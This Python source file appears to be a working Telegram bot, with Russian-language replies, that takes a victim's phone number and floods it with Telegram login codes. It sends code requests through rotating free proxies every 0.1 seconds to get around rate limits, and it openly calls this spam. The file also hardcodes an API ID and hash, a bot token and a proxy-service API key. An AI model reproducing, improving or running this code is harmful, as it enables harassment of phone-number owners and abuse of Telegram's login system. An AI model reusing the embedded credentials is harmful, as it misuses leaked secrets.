import asyncio
import aiohttp
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telethon import TelegramClient
from telethon.errors import FloodWaitError
from telethon.network.connection import ConnectionTcpAbridged
import socks

API_ID = 35911533
API_HASH = "11dafcdc1514796c867055023716d39a"
BOT_TOKEN = "8830187981:AAGZu4sKhuTpTSI8sPgliF2lvXYJotP1k1s"
PROXYSCRAPE_API_KEY = "nsnkzNnTDKT9L0cjnIOvS5eL7dvGxIxDFHtWDtwmA2PMMVDVKzu29u9rgqAJMLRn"

PROXYSCRAPE_URL = f"https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=protocolipport&format=text&api_key={PROXYSCRAPE_API_KEY}"

spam_tasks = {}
proxy_pool = []
proxy_index = 0

async def fetch_proxies():
    async with aiohttp.ClientSession() as session:
        async with session.get(PROXYSCRAPE_URL, timeout=20) as resp:
            text = await resp.text()
            raw = [line.strip() for line in text.splitlines() if line.strip()]
            proxies = []
            for item in raw:
                parts = item.split(':')
                if len(parts) >= 3:
                    protocol = parts[0].lower()
                    ip = parts[1]
                    port = parts[2]
                    if protocol in ('socks5', 'socks4', 'http', 'https'):
                        proxies.append({'protocol': protocol, 'ip': ip, 'port': int(port)})
            return proxies

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Отправь номер телефона в формате +7XXXXXXXXXX или +380XXXXXXXXX для спама кодами.")

async def stop_spam(update: Update, context: ContextTypes.DEFAULT_TYPE):
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        task, client = spam_tasks.pop(chat_id)
        if not task.done():
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
        await client.disconnect()
        await update.message.reply_text("Спам остановлен.")
    else:
        await update.message.reply_text("Нет активного спама.")

async def send_code_through_proxy(proxy, phone, chat_id, context):
    proto_map = {'socks5': socks.SOCKS5, 'socks4': socks.SOCKS4, 'http': socks.HTTP, 'https': socks.HTTP}
    proto = proto_map.get(proxy['protocol'], socks.SOCKS5)
    try:
        proxy_tuple = (proto, proxy['ip'], proxy['port'])
        async with TelegramClient(None, API_ID, API_HASH, proxy=proxy_tuple, connection=ConnectionTcpAbridged, timeout=10) as temp_client:
            await temp_client.connect()
            await temp_client.send_code_request(phone)
            return True
    except FloodWaitError as e:
        await context.bot.send_message(chat_id, f"FloodWait {e.seconds} сек на {proxy['ip']}")
        await asyncio.sleep(e.seconds)
        return True
    except Exception:
        return False

async def spam_worker(phone, chat_id, context):
    global proxy_index, proxy_pool
    count = 0
    while True:
        if not proxy_pool:
            await context.bot.send_message(chat_id, "Нет прокси, обновите /fetch_proxies")
            break
        proxy = proxy_pool[proxy_index % len(proxy_pool)]
        proxy_index += 1
        success = await send_code_through_proxy(proxy, phone, chat_id, context)
        if success:
            count += 1
            await context.bot.send_message(chat_id, f"Код #{count} отправлен через {proxy['protocol']}://{proxy['ip']}:{proxy['port']}")
        await asyncio.sleep(0.1)

async def handle_phone(update: Update, context: ContextTypes.DEFAULT_TYPE):
    phone = update.message.text.strip()
    chat_id = update.effective_chat.id
    if chat_id in spam_tasks:
        await update.message.reply_text("Уже идет спам для этого чата.")
        return

    global proxy_pool
    if not proxy_pool:
        await update.message.reply_text("Загружаю прокси...")
        proxy_pool = await fetch_proxies()
        if not proxy_pool:
            await update.message.reply_text("Не удалось получить прокси. Попробуй позже.")
            return

    client = TelegramClient(None, API_ID, API_HASH, connection=ConnectionTcpAbridged)
    await client.connect()

    task = asyncio.create_task(spam_worker(phone, chat_id, context))
    spam_tasks[chat_id] = (task, client)
    await update.message.reply_text(f"Спам запущен. Прокси: {len(proxy_pool)}. Для остановки /stop")

async def fetch_proxies_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global proxy_pool, proxy_index
    await update.message.reply_text("Обновляю список прокси...")
    proxy_pool = await fetch_proxies()
    proxy_index = 0
    if proxy_pool:
        await update.message.reply_text(f"Загружено {len(proxy_pool)} прокси.")
    else:
        await update.message.reply_text("Не удалось загрузить прокси.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("stop", stop_spam))
    app.add_handler(CommandHandler("fetch_proxies", fetch_proxies_command))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_phone))
    app.run_polling()

if __name__ == "__main__":
    main()
